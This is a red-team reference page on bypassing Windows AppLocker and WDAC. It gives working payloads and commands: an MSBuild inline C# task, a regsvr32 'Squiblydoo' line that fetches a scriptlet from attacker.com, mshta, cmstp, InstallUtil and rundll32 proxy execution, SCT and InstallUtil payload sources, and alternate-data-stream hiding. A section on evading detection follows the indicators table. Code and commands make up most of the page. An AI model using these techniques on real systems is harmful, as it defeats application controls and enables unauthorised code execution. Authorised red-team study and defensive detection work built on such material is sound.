# AppLocker & WDAC Bypass

> **MITRE ATT&CK**: Defense Evasion > T1218 - System Binary Proxy Execution
> **Platforms**: Windows
> **Required Privileges**: User
> **OPSEC Risk**: Medium

## Strategic Overview

AppLocker and Windows Defender Application Control (WDAC) restrict which executables, scripts, and DLLs can run. AppLocker is more commonly deployed and more commonly bypassed. For a Red Team Lead, understanding application whitelisting bypass is essential because these controls are often the first barrier after initial access. The key insight is that AppLocker trusts Microsoft-signed binaries by default, and dozens of these can proxy-execute arbitrary code.

## Technical Deep-Dive

### AppLocker Rule Types

| Rule Type | Controls | Weakness |
|-----------|----------|----------|
| Path | Execution from specific directories | Writable subdirectories under trusted paths |
| Publisher | Signed binaries from specific publishers | Microsoft-signed LOLBAS binaries |
| Hash | Specific file hashes | Brittle on updates, rarely used alone |
| Default Rules | %WINDIR%\*, %PROGRAMFILES%\*, Admins=* | Many writable locations under %WINDIR% |

### Trusted Writable Paths

```powershell
# User-writable paths trusted by default AppLocker rules
C:\Windows\Tasks\                                    C:\Windows\Temp\
C:\Windows\tracing\                                  C:\Windows\Registration\CRMLog\
C:\Windows\System32\FxsTmp\                          C:\Windows\System32\com\dmp\
C:\Windows\System32\spool\drivers\color\             C:\Windows\System32\spool\PRINTERS\

# Discovery: find writable directories under Windows
accesschk.exe -uwdqs Users "C:\Windows" -accepteula
icacls "C:\Windows\*" /findsid %USERNAME% /T /C 2>nul | findstr /I ":(F) :(W) :(M)"
```

### MSBuild.exe -- Inline C# Task Execution

```xml
<!-- payload.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute"><ExecTask/></Target>
  <UsingTask TaskName="ExecTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="Microsoft.Build.Tasks.v4.0.dll">
    <Task><Code Type="Class" Language="cs">
<![CDATA[
using System; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
public class ExecTask : Task {
    public override bool Execute() {
        System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\\Windows\\Temp\\out.txt");
        return true;
    }
}
]]>
    </Code></Task>
  </UsingTask>
</Project>
```

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

### Other LOLBAS Proxy Execution

```cmd
:: MSHTA -- VBScript/JScript via HTML Applications
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c whoami"", 0:close")

:: Regsvr32 (Squiblydoo) -- remote COM scriptlet, no local file needed
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

:: CMSTP -- Connection Manager Profile Installer (also bypasses UAC)
cmstp.exe /s /ns cmstp.inf

:: InstallUtil -- custom .NET installer class execution
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

:: Rundll32 -- DLL exports or inline JavaScript
rundll32.exe payload.dll,EntryPoint
```

### Regsvr32 SCT Payload

```xml
<?XML version="1.0"?>
<scriptlet>
  <registration progid="Bypass" classid="{10001111-0000-0000-0000-0000FEEDACDC}">
    <script language="JScript">
      <![CDATA[ new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]>
    </script>
  </registration>
</scriptlet>
```

### InstallUtil Payload

```csharp
// Compile: csc /target:library /out:payload.dll payload.cs
using System; using System.Diagnostics;
[System.ComponentModel.RunInstaller(true)]
public class Bypass : System.Configuration.Install.Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        Process.Start("cmd.exe", "/c whoami");
    }
}
```

### Alternate Data Streams and DLL Rule Gaps

```cmd
:: Hide payload in an Alternate Data Stream
type payload.exe > "C:\Windows\Tasks\legit.txt:payload.exe"
wmic process call create "C:\Windows\Tasks\legit.txt:payload.exe"

:: Check if DLL rules are enforced (often absent due to performance impact)
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
:: If DLL rules are absent, load any DLL freely via rundll32
```

### WDAC (Windows Defender Application Control)

WDAC operates at the kernel level and is significantly harder to bypass than AppLocker:

```powershell
# Check WDAC enforcement status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# Bypasses are rarer: managed COM objects in trusted paths, signed-but-vulnerable
# .NET assemblies, CI policy file manipulation, specific unlisted LOLBINs
```

## Detection & Evasion

| Indicator | Source | Notes |
|-----------|--------|-------|
| Event ID 8003/8004 | AppLocker logs | EXE/DLL block events |
| MSBuild.exe spawning cmd/powershell | Process creation | Anomalous child process |
| MSHTA with inline script | Command line logging | VBScript in command line |
| Regsvr32 with /i:http | Sysmon Event ID 1 | Remote SCT loading |
| Files in C:\Windows\Tasks | File creation monitoring | Unusual location for executables |

**Evasion Guidance**: Enumerate rules first with `Get-AppLockerPolicy -Effective`. Prefer MSBuild (most versatile LOLBIN). Avoid MSHTA/regsvr32 in mature environments (heavily signatured). Use DLL payloads when DLL rules are unenforced. Combine with AMSI bypass since AppLocker bypasses often land in PowerShell.

## Cross-References

- [CLM Bypass](clm-bypass.md) -- AppLocker enforces Constrained Language Mode on PowerShell
- [AMSI Bypass](amsi-bypass.md) -- needed after gaining script execution through AppLocker bypass
- [Signature Evasion](signature-evasion.md) -- payload must also evade static AV scanning
- [AV/EDR Evasion](av-edr-evasion.md) -- EDR monitors LOLBIN execution patterns

## References

- LOLBAS Project: https://lolbas-project.github.io/
- Ultimate AppLocker Bypass List: https://github.com/api0cradle/UltimateAppLockerByPassList
- Casey Smith (@subtee) -- original Squiblydoo and LOLBIN research
- WDAC bypass research by Matt Graeber
